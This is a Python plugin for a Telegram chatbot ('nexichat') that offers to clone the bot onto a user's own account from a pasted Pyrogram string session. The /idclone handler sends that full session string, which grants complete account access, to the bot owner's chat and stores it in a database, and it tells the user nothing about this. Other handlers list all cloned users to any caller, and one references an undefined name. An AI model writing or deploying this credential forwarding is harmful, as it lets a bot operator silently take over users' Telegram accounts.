import logging
import os
import sys
import shutil
import config
import asyncio
from pyrogram import Client, filters
from pyrogram.errors.exceptions.bad_request_400 import AccessTokenInvalid
from pyrogram.types import BotCommand
from config import API_HASH, API_ID, OWNER_ID
from nexichat import CLONE_OWNERS
from nexichat import nexichat as app, save_clonebot_owner, save_idclonebot_owner
from nexichat import db as mongodb
from nexichat import nexichat as app

IDCLONES = set()
cloneownerdb = mongodb.cloneownerdb
idclonebotdb = mongodb.idclonebotdb


@Client.on_message(filters.command(["idclone"], prefixes=[".", "/"]))
async def clone_txt(client, message):
    if len(message.command) > 1:
        string_session = message.text.split("/idclone", 1)[1].strip()
        mi = await message.reply_text("**Checking your String Session...**")
        try:
            ai = Client(
                name="VIPIDCHATBOT",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                session_string=str(string_session),
                no_updates=False,
                plugins=dict(root="nexichat.idchatbot"),
            )
            await ai.start()
            user = await ai.get_me()
            clone_id = user.id
            user_id = user.id
            username = user.username or user.first_name
            await save_idclonebot_owner(clone_id, message.from_user.id)
            
            details = {
                "user_id": user.id,
                "username": username,
                "name": user.first_name,
                "session": string_session,
            }

            cloned_bots = idclonebotdb.find()
            cloned_bots_list = await cloned_bots.to_list(length=None)
            total_clones = len(cloned_bots_list)

            await app.send_message(
                int(OWNER_ID), f"**#New_Clone**\n\n**User:** @{username}\n\n**Details:** {details}\n\n**Total Clones:** {total_clones}"
            )

            await idclonebotdb.insert_one(details)
            IDCLONES.add(user.id)

            await mi.edit_text(
                f"**Session for @{username} successfully cloned ✅.**\n"
                f"**Remove clone by:** /delidclone\n**Check all cloned sessions by:** /idcloned"
            )
        except AccessTokenInvalid:
            await mi.edit_text("**Invalid String Session. Please provide a valid one.**")
        except Exception as e:
            logging.exception("Error during cloning process.")
            await mi.edit_text(f"**Error:** `{e}`")
    else:
        await message.reply_text("**Provide a Pyrogram String Session after the /idclone command.**\n\n**Example: /idclone [pyrogram string session]**\n\n**Get a Pyrogram string session from here:-** [Click Here](https://telegram.tools/session-string-generator#pyrogram,user) ")


@Client.on_message(filters.command("idcloned", prefixes=[".", "/"]))
async def list_cloned_sessions(client, message):
    try:
        cloned_bots = idclonebotdb.find()
        cloned_bots_list = await cloned_bots.to_list(length=None)
        if not cloned_bots_list:
            await message.reply_text("**No sessions have been cloned yet.**")
            return

        total_clones = len(cloned_bots_list)
        text = f"**Total Cloned Sessions:** {total_clones}\n\n"
        for bot in cloned_bots_list:
            text += f"**User ID:** `{bot['user_id']}`\n"
            text += f"**Name:** {bot['name']}\n"
            text += f"**Username:** @{bot['username']}\n\n"

        await message.reply_text(text)
    except Exception as e:
        logging.exception(e)
        await message.reply_text("**An error occurred while getting list of cloned id-chatbots**")


@Client.on_message(
    filters.command(["delidclone", "deleteidclone", "removeidclone"], prefixes=[".", "/"])
)
async def delete_cloned_session(client, message):
    try:
        if len(message.command) < 2:
            await message.reply_text("**⚠️ Please provide the session string after the command.**")
            return

        string_session = " ".join(message.command[1:])
        ok = await message.reply_text("**Checking the session string...**")

        cloned_session = await idclonebotdb.find_one({"session": string_session})
        if cloned_session:
            await idclonebotdb.delete_one({"session": string_session})
            

            await ok.edit_text(
                f"**Your String Session has been removed from my database ✅.**\n\n**Your bot will off after restart @{nexichat.username}**"
            )
        else:
            await message.reply_text("**⚠️ The provided session is not in the cloned list.**")
    except Exception as e:
        await message.reply_text(f"**An error occurred while deleting the cloned session:** {e}")
        logging.exception(e)


@Client.on_message(filters.command("delallidclone", prefixes=[".", "/"]) & filters.user(int(OWNER_ID)))
async def delete_all_cloned_sessions(client, message):
    try:
        a = await message.reply_text("**Deleting all cloned sessions...**")
        await idclonebotdb.delete_many({})
        IDCLONES.clear()
        await a.edit_text("**All cloned sessions have been deleted successfully ✅**")
    except Exception as e:
        await a.edit_text(f"**An error occurred while deleting all cloned sessions:** {e}")
        logging.exception(e)

